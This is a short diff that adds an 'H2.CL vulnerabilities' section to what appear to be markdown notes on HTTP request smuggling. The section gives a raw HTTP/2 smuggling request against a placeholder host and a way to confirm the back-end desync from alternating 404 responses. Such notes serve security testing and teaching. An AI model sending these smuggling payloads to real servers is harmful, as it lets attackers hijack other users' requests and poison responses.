@@ -71,3 +71,12 @@ Transfer-Encoding
 : chunked
 ```
 
+## H2.CL vulnerabilities
+```
+POST / HTTP/2
+Host: vulnerable-website.com
+Content-Length: 0
+
+SMUGGLED
+```
+Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
